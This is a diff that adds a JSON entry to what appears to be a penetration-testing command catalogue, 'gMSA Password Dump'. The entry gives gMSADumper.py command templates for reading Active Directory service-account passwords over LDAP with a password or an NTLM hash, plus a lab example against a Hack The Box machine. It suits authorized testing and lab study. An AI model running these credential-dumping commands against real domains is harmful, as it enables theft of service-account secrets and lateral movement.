@@ -1,0 +1,35 @@
+{
+  "id": "gmsa-dumper",
+  "name": "gMSA Password Dump",
+  "command": "python gMSADumper.py -u '<user>' -p '<password>' -d '<domain>' -l '<ip>'",
+  "description": "Read password of Group Managed Service Account",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "ldap"
+  ],
+  "tags": [
+    "gmsa",
+    "password",
+    "service-account",
+    "ldap"
+  ],
+  "variations": [
+    {
+      "label": "NTLM Hash",
+      "requires": "hash",
+      "command": "python gMSADumper.py -u '<user>' -p '<hash>' -d '<domain>' -l '<ip>'"
+    }
+  ],
+  "references": [
+    {
+      "title": "ReadGMSAPassword",
+      "url": "https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword"
+    }
+  ],
+  "examples": [
+    "python gMSADumper.py -u alfred -p basketball -d tombwatcher.htb -l tombwatcher.htb"
+  ]
+}
